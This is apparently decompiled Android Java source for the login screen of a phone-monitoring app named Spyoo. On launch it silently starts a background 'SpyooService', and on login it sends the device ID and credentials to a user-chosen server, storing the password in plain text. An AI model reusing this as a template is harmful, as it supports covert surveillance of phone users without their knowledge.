package iits.spyoo;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.SpinnerAdapter;
import iits.code.bus.Account_BUS;
import iits.code.bus.Setting_BUS;
import iits.code.dto.Account_DTO;
import iits.common.Constants;
import iits.common.Function;
import iits.mamager.FileManager;
import iits.mamager.LoginManager;
import iits.service.SpyooService;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import org.apache.http.HttpResponse;

public class Login extends Activity implements View.OnClickListener {
    private static final String TAG = "Login";
    private ArrayAdapter<CharSequence> arrItemSpinner;
    private ArrayAdapter<CharSequence> arrItemSpinnerFromResource;
    Button btnAbout;
    Button btnExit;
    Button btnLogin;
    Button btnSetting;
    private AlertDialog.Builder builder;
    Spinner spnWebsite;
    EditText txtOtherWebsite;
    EditText txtPassword;
    EditText txtUserName;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.login);
        init();
    }

    public void init() {
        this.txtUserName = (EditText) findViewById(R.id.txtUserName);
        this.txtPassword = (EditText) findViewById(R.id.txtPassword);
        this.btnLogin = (Button) findViewById(R.id.btnLogin);
        this.btnSetting = (Button) findViewById(R.id.btnSetting);
        this.btnAbout = (Button) findViewById(R.id.btnAbout);
        this.btnExit = (Button) findViewById(R.id.btnExit);
        this.spnWebsite = (Spinner) findViewById(R.id.spnWebsite);
        this.btnLogin.setOnClickListener(this);
        this.btnSetting.setOnClickListener(this);
        this.btnAbout.setOnClickListener(this);
        this.btnExit.setOnClickListener(this);
        initOtherWebsiteSpiner();
        initUserNameAndPassword();
        Setting_BUS.setLink(getApplicationContext(), this.spnWebsite.getItemAtPosition(0).toString());
        if (!Function.isServiceRunning(getApplicationContext(), Constants.SERVICE_NAME)) {
            startService(new Intent(this, SpyooService.class));
        }
    }

    public void initOtherWebsiteSpiner() {
        try {
            this.arrItemSpinner = new ArrayAdapter<>(this, 17367048);
            this.arrItemSpinner.setDropDownViewResource(17367049);
            this.arrItemSpinnerFromResource = ArrayAdapter.createFromResource(this, R.array.websites, 17367048);
            int n = this.arrItemSpinnerFromResource.getCount();
            for (int i = 0; i < n; i++) {
                this.arrItemSpinner.add(this.arrItemSpinnerFromResource.getItem(i));
            }
            int position = -1;
            String linkWebsite = Setting_BUS.getLink(getApplicationContext()).replace("http://", "");
            int i2 = 0;
            while (true) {
                if (i2 >= n) {
                    break;
                } else if (linkWebsite.equals(this.arrItemSpinner.getItem(i2).toString())) {
                    position = i2;
                    break;
                } else {
                    i2++;
                }
            }
            if (position == -1) {
                if (!linkWebsite.equals("")) {
                    this.arrItemSpinner.insert(linkWebsite, 0);
                }
                position = 0;
            }
            this.spnWebsite.setAdapter((SpinnerAdapter) this.arrItemSpinner);
            this.spnWebsite.setSelection(position);
            this.spnWebsite.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
                /* class iits.spyoo.Login.AnonymousClass1 */

                @Override // android.widget.AdapterView.OnItemSelectedListener
                public void onItemSelected(AdapterView<?> parentView, View selectedItemView, int position, long id) {
                    Setting_BUS.setLink(Login.this.getApplicationContext(), "http://" + parentView.getItemAtPosition(position).toString());
                }

                @Override // android.widget.AdapterView.OnItemSelectedListener
                public void onNothingSelected(AdapterView<?> adapterView) {
                }
            });
        } catch (Exception ex) {
            FileManager.WriteLog(3, TAG, "Error on initOtherWebsiteSpiner function: " + ex.toString());
        }
    }

    public void initUserNameAndPassword() {
        try {
            Account_DTO account = Account_BUS.get(getApplicationContext());
            if (account != null) {
                this.txtUserName.setText(account.getUsername());
                this.txtPassword.setText(account.getPassword());
            }
        } catch (Exception ex) {
            FileManager.WriteLog(3, TAG, "Error on initUserNameAndPassword function: " + ex.toString());
        }
    }

    public void onClick(View view) {
        try {
            if (view == this.btnLogin) {
                FileManager.WriteLog(1, TAG, "click login button");
                clickLoginButton();
            }
            if (view == this.btnSetting) {
                FileManager.WriteLog(1, TAG, "click setting button");
                clickSettingButton();
            }
            if (view == this.btnAbout) {
                FileManager.WriteLog(1, TAG, "click about button");
                clickAboutButton();
            }
            if (view == this.btnExit) {
                FileManager.WriteLog(1, TAG, "click exit button");
                finish();
            }
        } catch (Exception e) {
            FileManager.WriteLog(1, TAG, "Error on onClick function: " + e.toString());
            finish();
        }
    }

    public void clickLoginButton() {
        int i;
        try {
            String userName = this.txtUserName.getText().toString().trim();
            String password = this.txtPassword.getText().toString().trim();
            if (userName.equals("") || password.equals("")) {
                showMessageBox(R.string.login, R.drawable.warning, R.string.username_password_empty, R.string.ok);
                return;
            }
            HttpResponse response = LoginManager.login(getApplicationContext(), String.valueOf(Setting_BUS.getLink(getApplicationContext())) + Constants.URL_LOGIN, URLEncoder.encode(userName), URLEncoder.encode(password), ((TelephonyManager) getSystemService("phone")).getDeviceId());
            if (response != null) {
                try {
                    i = Integer.parseInt(new BufferedReader(new InputStreamReader(response.getEntity().getContent())).readLine());
                } catch (Exception e) {
                    i = 2;
                }
                if (i == 0) {
                    showMessageBox(R.string.login, R.drawable.warning, R.string.username_password_not_exists, R.string.ok);
                } else if (i < 0) {
                    showMessageBox(R.string.login, R.drawable.warning, R.string.error_max_device, R.string.ok);
                } else if (i == 1) {
                    Account_DTO account = Account_BUS.get(getApplicationContext());
                    account.setUsername(userName);
                    account.setPassword(password);
                    Account_BUS.update(getApplicationContext(), account);
                    showMessageBox(R.string.login, R.drawable.select, R.string.login_successful, R.string.ok);
                } else {
                    showMessageBox(R.string.login, R.drawable.warning, R.string.error_website_invalid, R.string.ok);
                }
            } else {
                showMessageBox(R.string.login, R.drawable.warning, R.string.internet_not_connect, R.string.ok);
            }
        } catch (Exception e2) {
            FileManager.WriteLog(3, TAG, "Error on clickLoginButton function: " + e2.toString());
        }
    }

    public void clickSettingButton() {
        try {
            Intent i = new Intent(this, Setting.class);
            i.setFlags(268435456);
            startActivity(i);
            finish();
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on clickSettingButton function: " + e.toString());
        }
    }

    public void clickAboutButton() {
        try {
            Intent i = new Intent(this, About.class);
            i.setFlags(268435456);
            startActivity(i);
            finish();
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on clickAboutButton function: " + e.toString());
        }
    }

    public void showMessageBox(int title, int icon, int message, int buttonText) {
        this.builder = new AlertDialog.Builder(this);
        this.builder.setTitle(title);
        this.builder.setIcon(icon);
        this.builder.setMessage(message);
        this.builder.setNeutralButton(buttonText, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Login.AnonymousClass2 */

            public void onClick(DialogInterface dialog, int whichButton) {
                dialog.dismiss();
            }
        });
        this.builder.show();
    }

    public void showAlertOfOtherWebsite(int title, int icon, int message, int buttonText) {
        this.builder = new AlertDialog.Builder(this);
        this.builder.setTitle(title);
        this.builder.setIcon(icon);
        this.builder.setMessage(message);
        this.builder.setNeutralButton(buttonText, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Login.AnonymousClass3 */

            public void onClick(DialogInterface dialog, int whichButton) {
                dialog.dismiss();
                Login.this.showDialogOtherWebSite();
            }
        });
        this.builder.show();
    }

    public void showDialogOtherWebSite() {
        View layout = ((LayoutInflater) getApplicationContext().getSystemService("layout_inflater")).inflate(R.layout.dialog_otherwebsite, (ViewGroup) findViewById(R.id.layout_root_ortherwebsite));
        this.txtOtherWebsite = (EditText) layout.findViewById(R.id.etOtherWebsite);
        this.txtOtherWebsite.setText("www.");
        this.builder = new AlertDialog.Builder(this);
        this.builder.setView(layout);
        this.builder.setIcon(R.drawable.select);
        this.builder.setTitle(R.string.other_website);
        this.builder.setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Login.AnonymousClass4 */

            public void onClick(DialogInterface dialog, int whichButton) {
                int position = -1;
                int n = Login.this.arrItemSpinner.getCount();
                String link = Setting_BUS.getLink(Login.this.getApplicationContext()).replace("http://", "");
                int i = 0;
                while (true) {
                    if (i >= n - 1) {
                        break;
                    } else if (link.equals(((CharSequence) Login.this.arrItemSpinner.getItem(i)).toString())) {
                        position = i;
                        break;
                    } else {
                        i++;
                    }
                }
                if (position == -1) {
                    Login.this.arrItemSpinner.insert(link, 0);
                    Login.this.spnWebsite.setSelection(0);
                } else {
                    Login.this.spnWebsite.setSelection(position);
                }
                dialog.dismiss();
            }
        });
        this.builder.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Login.AnonymousClass5 */

            public void onClick(DialogInterface dialog, int whichButton) {
                int i;
                try {
                    String otherWebsiteSpinner = Login.this.txtOtherWebsite.getText().toString().trim().replace("http://", "");
                    String otherWebsiteDatabase = "http://" + otherWebsiteSpinner;
                    HttpResponse response = LoginManager.login(Login.this.getApplicationContext(), String.valueOf(otherWebsiteDatabase) + Constants.URL_LOGIN, "", "", "");
                    if (response != null) {
                        try {
                            i = Integer.parseInt(new BufferedReader(new InputStreamReader(response.getEntity().getContent())).readLine());
                        } catch (Exception e) {
                            i = 2;
                        }
                        if (i == 0) {
                            int position = -1;
                            for (int j = 0; j < Login.this.arrItemSpinner.getCount() - 1; j++) {
                                if (otherWebsiteSpinner.equals(Login.this.arrItemSpinner.getItem(j))) {
                                    position = j;
                                }
                            }
                            if (position != -1) {
                                Login.this.spnWebsite.setSelection(position);
                                dialog.dismiss();
                                return;
                            }
                            Setting_BUS.setLink(Login.this.getApplicationContext(), otherWebsiteDatabase);
                            if (Login.this.arrItemSpinner.getCount() > Login.this.arrItemSpinnerFromResource.getCount()) {
                                Login.this.arrItemSpinner.remove((CharSequence) Login.this.arrItemSpinner.getItem(0));
                            }
                            Login.this.arrItemSpinner.insert(otherWebsiteSpinner, 0);
                            Login.this.spnWebsite.setSelection(0);
                            dialog.dismiss();
                        } else {
                            Login.this.showAlertOfOtherWebsite(R.string.warning, R.drawable.warning, R.string.error_website_invalid, R.string.ok);
                        }
                    } else {
                        Login.this.showAlertOfOtherWebsite(R.string.warning, R.drawable.warning, R.string.internet_not_connect, R.string.ok);
                    }
                    dialog.dismiss();
                } catch (Exception e2) {
                    FileManager.WriteLog(3, Login.TAG, "Error on onClick function: " + e2.toString());
                }
            }
        });
        this.builder.show();
    }
}
